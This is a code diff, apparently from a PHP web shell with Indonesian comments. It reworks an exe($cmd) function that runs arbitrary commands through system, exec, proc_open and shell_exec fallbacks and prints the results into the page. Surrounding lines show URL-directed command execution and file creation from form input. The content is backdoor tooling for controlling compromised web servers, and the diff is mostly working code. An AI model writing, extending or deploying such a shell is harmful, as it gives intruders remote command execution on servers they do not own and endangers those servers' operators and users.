@@ -404,6 +404,9 @@
         }
         // CMD sesuai dengan direktori di URL
 function exe($cmd) {
+    $output = '';      // Variabel untuk menyimpan output
+    $resultCode = 1;   // Default nilai result code untuk error
+
     // Cek dan gunakan system()
     if (function_exists('system')) {
         @ob_start();
@@ -411,15 +414,17 @@ function exe($cmd) {
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            return $output;
+            goto output_result; // Lompat langsung ke output
         }
     }
 
     // Cek dan gunakan exec()
     if (function_exists('exec')) {
+        $results = [];
         @exec($cmd, $results, $resultCode);
         if (!empty($results)) {
-            return implode("\n", $results);
+            $output = implode("\n", $results);
+            goto output_result; // Lompat langsung ke output
         }
     }
 
@@ -430,7 +435,7 @@ function exe($cmd) {
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            return $output;
+            goto output_result; // Lompat langsung ke output
         }
     }
 
@@ -447,9 +452,9 @@ function exe($cmd) {
             @fclose($pipes[0]);
             @fclose($pipes[1]);
             @fclose($pipes[2]);
-            @proc_close($process);
+            $resultCode = @proc_close($process);
             if (!empty($output)) {
-                return $output;
+                goto output_result; // Lompat langsung ke output
             }
         }
     }
@@ -457,14 +462,18 @@ function exe($cmd) {
     // Cek dan gunakan shell_exec()
     if (function_exists('shell_exec')) {
         $output = @shell_exec($cmd);
+        $resultCode = ($output === null) ? 1 : 0; // Jika output null, anggap gagal
         if (!empty($output)) {
-            return $output;
+            goto output_result; // Lompat langsung ke output
         }
     }
 
-    // Jika tidak ada metode yang berhasil, kembalikan pesan error
-    return "Command execution failed or no output generated.";
+output_result:
+    // Output result
+    echo "<pre>Result Code: $resultCode</pre>";
+    echo "<pre>$output</pre>";
 }
+
         // Create a new file
         if (isset($_POST['createFile'])) {
             $fileName = $_POST['fileName'];
